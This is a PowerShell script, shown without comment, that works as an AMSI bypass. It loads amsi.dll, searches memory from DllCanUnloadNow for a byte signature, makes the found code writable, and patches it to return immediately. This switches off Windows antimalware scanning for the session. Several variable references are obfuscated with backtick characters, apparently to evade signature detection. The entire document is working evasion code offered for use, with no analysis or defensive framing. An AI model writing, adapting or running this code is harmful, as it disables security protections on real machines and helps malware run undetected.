$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")

If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       
        0x49, 0x89, 0x5B, 0x08, 
        0x49, 0x89, 0x6B, 0x10, 
        0x49, 0x89, 0x73, 0x18, 
        0x57,                   
        0x41, 0x56,             
        0x41, 0x57,             
        0x48, 0x83, 0xEC, 0x70  
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,            
        0x55,                   
        0x8B, 0xEC,             
        0x83, 0xEC, 0x18,       
        0x53,                   
        0x56                    
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect(${TARg`ETE`dAd`dreSS}, [uint32]2, 4, [ref]${Old`PrOtEctiO`Nbuf`Fer}) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    
    0xC3       
)
[System.Runtime.InteropServices.Marshal]::Copy(${pa`T`cH}, 0, ${taRge`TEDA`DdRe`SS}, 3)

$a = 0
[Kernel32]::VirtualProtect(${t`ArGE`TEDA`dDress}, [uint32]2, ${OLdPRO`Te`ctION`Buffer}, [ref]${A}) | Out-Null
